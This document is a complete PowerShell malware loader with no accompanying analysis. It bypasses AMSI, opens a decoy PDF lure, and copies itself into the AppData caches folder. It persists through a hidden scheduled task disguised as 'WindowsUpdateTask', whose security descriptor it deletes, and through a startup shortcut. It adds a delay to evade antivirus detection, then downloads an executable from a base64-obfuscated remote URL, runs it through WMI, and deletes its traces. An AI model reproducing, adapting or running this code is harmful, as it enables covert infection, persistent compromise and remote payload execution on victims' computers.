$ErrorActionPreference = 'SilentlyContinue'

# === LIGHTWEIGHT AMSI BYPASS ===
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# === QUICK DECOY PDF OPEN (IMMEDIATE) ===
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$flagFile = "$cache\installed.flag"
$isFirstRun = -not (Test-Path $flagFile)

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

if ($isFirstRun) {
    if (-not (Test-Path $pdfPath)) {
        try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
    }
    if (Test-Path $pdfPath) {
        try { Start-Process $pdfPath } catch {}
        New-Item -Path $flagFile -ItemType File -Force | Out-Null
    }
}

# === SELF-PRESERVATION ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch { exit }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}
$scriptPath = Save-ScriptToDisk -Destination $localPath

# === PERSISTENCE: Scheduled Task ===
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    try {
        $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
    } catch {}
}

# === PERSISTENCE: Startup LNK ===
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wshShell = New-Object -ComObject WScript.Shell
    $shortcut = $wshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $shortcut.WindowStyle = 7
    $shortcut.Save()
}

# === BEARFOOS EVASION: Long delay before EXE download ===
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# === DOWNLOAD EXE TO MEMORY FIRST, THEN WRITE AND EXECUTE IMMEDIATELY ===
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
$exePath = "$cache\helper.exe"

# Download to memory as byte array (avoids disk write until ready)
try {
    $exeBytes = (New-Object Net.WebClient).DownloadData($exeUrl)
    # Write to disk and execute immediately
    [System.IO.File]::WriteAllBytes($exePath, $exeBytes)
    
    # Execute via WMI with minimal delay
    Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 500)
    try {
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
    } catch {
        try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) } catch { Start-Process $exePath -WindowStyle Hidden }
    }
} catch {
    # Fallback to traditional download if memory fails
    try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
    if (Test-Path $exePath) {
        try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null } catch {}
    }
}

# === CLEANUP ===
Start-Job -ScriptBlock { param($exe, $pdf) Start-Sleep -Seconds 300; Remove-Item $exe,$pdf -Force -ErrorAction SilentlyContinue } -ArgumentList $exePath, $pdfPath | Out-Null
